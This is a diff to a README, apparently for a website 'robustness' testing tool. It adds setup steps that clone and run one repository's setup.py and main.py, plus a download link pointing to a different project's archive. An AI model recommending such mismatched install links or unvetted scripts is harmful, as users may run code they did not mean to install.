@@ -23,4 +23,18 @@ it can be used to test the robustness of a website. 📡
 <h1 align="center">GUI 🎉</h1> 
 
 ![gui](https://github.com/user-attachments/assets/faeda7fa-1378-4a62-b822-bde0edb66bfa)
+## 🐢 ~ Setup  :
+
+<a href="https://github.com/fluzyteck/RedTiger/archive/main.zip">Dowloads Tools Here</a>
+
+<p>
+  
+```
+git clone https://github.com/barra-dev0/Barracuda
+cd Barracuda
+python3 setup.py
+python3 main.py
+```
+
+</p>
 
